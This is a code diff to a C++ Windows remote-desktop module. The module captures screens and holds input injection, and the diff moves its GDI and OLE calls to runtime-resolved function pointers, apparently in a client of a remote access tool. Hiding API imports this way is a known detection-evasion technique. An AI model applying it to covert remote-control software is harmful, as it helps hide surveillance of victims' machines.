@@ -3,7 +3,7 @@
 #include "misc.hpp"
 
 extern Cliente* cCliente;
-mod_RemoteDesktop* mod_Instance = nullptr;
+mod_RemoteDesktop* mod_Instance_RD = nullptr;
 
 std::vector<Monitor> tmp_Monitores;
 
@@ -200,13 +200,17 @@ int mod_RemoteDesktop::BitmapDiff(std::shared_ptr<Gdiplus::Bitmap>& _oldBitmap, 
 }
 
 void mod_RemoteDesktop::InitGDI() {
-    if (Gdiplus::GdiplusStartup(&this->gdiplusToken, &this->gdiplusStartupInput, NULL) == Gdiplus::Status::Ok) {
-        this->isGDIon = true;
+    if (this->GDIPLUS.pGdiplusStartup) {
+       if (this->GDIPLUS.pGdiplusStartup(&this->gdiplusToken, &this->gdiplusStartupInput, NULL) == Gdiplus::Status::Ok) {
+            this->isGDIon = true;
+        }
     }
 }
 
 void mod_RemoteDesktop::StopGDI() {
-    Gdiplus::GdiplusShutdown(this->gdiplusToken);
+    if (this->GDIPLUS.pGdiplusShutdown) {
+        this->GDIPLUS.pGdiplusShutdown(this->gdiplusToken);
+    }
 }
 
 ULONG mod_RemoteDesktop::m_Quality() {
@@ -222,6 +226,9 @@ void mod_RemoteDesktop::m_UpdateQuality(int iNew) {
 
 mod_RemoteDesktop::mod_RemoteDesktop(HMODULE _user32DLL) {
     this->hUser32DLL = _user32DLL;
+    this->hGdi32DLL = wrapLoadDLL("gdi32.dll");
+    this->hGdiPlusDLL = wrapLoadDLL("gdiplus.dll");
+    this->hOle32 = wrapLoadDLL("ole32.dll");
 
     if (this->hUser32DLL) {
         this->USER32.pSendInput = (st_User32_RD::LPSENDINPUT)wrapGetProcAddr(this->hUser32DLL, "SendInput");
@@ -231,20 +238,54 @@ mod_RemoteDesktop::mod_RemoteDesktop(HMODULE _user32DLL) {
         this->USER32.pGetMonitorInfoA = (st_User32_RD::LPGETMONITORINFOA)wrapGetProcAddr(this->hUser32DLL, "GetMonitorInfoA");
     }
 
+    if (this->hGdi32DLL) {
+        this->GDI32.pCreateCompatibleDC = (st_Gdi32::LPCREATECOMPATIBLEDC)wrapGetProcAddr(this->hGdi32DLL, "CreateCompatibleDC");
+        this->GDI32.pCreateCompatibleBitmap = (st_Gdi32::LPCREATECOMPATIBLEBITMAP)wrapGetProcAddr(this->hGdi32DLL, "CreateCompatibleBitmap");
+        this->GDI32.pSelectObject = (st_Gdi32::LPSELECTOBJECT)wrapGetProcAddr(this->hGdi32DLL, "SelectObject");
+        this->GDI32.pBitBlt = (st_Gdi32::LPBITBLT)wrapGetProcAddr(this->hGdi32DLL, "BitBlt");
+    }
+
+    if (this->hOle32) {
+        this->OLE32.pCreateStreamOnHGlobal = (st_Ole32::LPCREATESTREAMONHGLOBAL)wrapGetProcAddr(this->hOle32, "CreateStreamOnHGlobal");
+    }
+
+    if (this->hGdiPlusDLL) {
+        this->GDIPLUS.pGdiplusStartup = (st_GdiPlus::LPGDIPLUSSTARTUP)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusStartup");
+        this->GDIPLUS.pGdiplusShutdown = (st_GdiPlus::LPGDIPLUSSHUTDOWN)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusShutdown");
+    }
+
     this->InitGDI();
     
-    mod_Instance = this;
+    mod_Instance_RD = this;
 
     return;
 }
 
 mod_RemoteDesktop::~mod_RemoteDesktop() {
     this->StopGDI();
+
+    if (this->hGdi32DLL) {
+        wrapFreeLibrary(this->hGdi32DLL);
+    }
+
+    if (this->hGdiPlusDLL) {
+        wrapFreeLibrary(this->hGdiPlusDLL);
+    }
+
+    if (this->hOle32) {
+        wrapFreeLibrary(this->hOle32);
+    }
+
     return;
 }
 
 std::shared_ptr<Gdiplus::Bitmap> mod_RemoteDesktop::getFrameBitmap(ULONG quality, int index) {
     std::shared_ptr<Gdiplus::Bitmap> outBitmap = nullptr;
+
+    if (!this->GDI32.pCreateCompatibleBitmap || !this->GDI32.pCreateCompatibleDC ||
+        !this->GDI32.pSelectObject || !this->GDI32.pBitBlt || !this->OLE32.pCreateStreamOnHGlobal) {
+        return outBitmap;
+    }
 
     Monitor monitor = this->m_GetMonitor(index);
     if (monitor.rectData.resHeight == 0) {
@@ -294,22 +335,22 @@ std::shared_ptr<Gdiplus::Bitmap> mod_RemoteDesktop::getFrameBitmap(ULONG quality
         goto EndSec;
     }
 
-    hdcMemDC = CreateCompatibleDC(hdcMonitor);
+    hdcMemDC = this->GDI32.pCreateCompatibleDC(hdcMonitor);
     if (!hdcMemDC) {
         __DBG_("GetcomtabielDC failed\n");
         goto EndSec;
     }
 
-    hmpScreen = CreateCompatibleBitmap(hdcMonitor, monitor.rectData.resWidth, monitor.rectData.resHeight);
+    hmpScreen = this->GDI32.pCreateCompatibleBitmap(hdcMonitor, monitor.rectData.resWidth, monitor.rectData.resHeight);
     if (!hmpScreen) {
         __DBG_("Createcompatiblebitmap failed\n");
         goto EndSec;
     }
-    if (!SelectObject(hdcMemDC, hmpScreen)) {
+    if (!this->GDI32.pSelectObject(hdcMemDC, hmpScreen)) {
         __DBG_("select object failed\n");
         goto EndSec;
     }
-    if (!BitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
+    if (!this->GDI32.pBitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
         __DBG_("bitblt failed\n");
         goto EndSec;
     }
@@ -327,7 +368,7 @@ std::shared_ptr<Gdiplus::Bitmap> mod_RemoteDesktop::getFrameBitmap(ULONG quality
         }
     }
 
-    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
+    hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
         __DBG_("CreateStreamOnHGlobal error\n");
         goto EndSec;
@@ -535,7 +576,7 @@ std::vector<Monitor> mod_RemoteDesktop::m_ListaMonitores() {
 
     if (!this->USER32.pEnumDisplayMonitors) {
         __DBG_("[user32.dll] EnumDisplayMonitors no cargado");
-        return;
+        return this->m_GetVectorCopy();
     }
     
     this->USER32.pEnumDisplayMonitors(NULL, NULL, this->MonitorEnumProc, 0);
@@ -549,7 +590,7 @@ std::vector<Monitor> mod_RemoteDesktop::m_ListaMonitores() {
 }
 
 BOOL mod_RemoteDesktop::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT rectMonitor, LPARAM lparam) {
-    if (!mod_Instance->USER32.pGetMonitorInfoA) {
+    if (!mod_Instance_RD->USER32.pGetMonitorInfoA) {
         return FALSE;
     }
     MONITORINFOEX info;
@@ -562,7 +603,7 @@ BOOL mod_RemoteDesktop::MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPREC
     new_Monitor.rectData.xStart = rectMonitor->left;
     new_Monitor.rectData.yStart = rectMonitor->top;
     ZeroMemory(new_Monitor.szDevice, sizeof(new_Monitor.szDevice));
-    if (mod_Instance->USER32.pGetMonitorInfoA(hMonitor, &info)) {
+    if (mod_Instance_RD->USER32.pGetMonitorInfoA(hMonitor, &info)) {
         memcpy(new_Monitor.szDevice, info.szDevice, sizeof(new_Monitor.szDevice) - 1);
     }
     tmp_Monitores.push_back(new_Monitor);
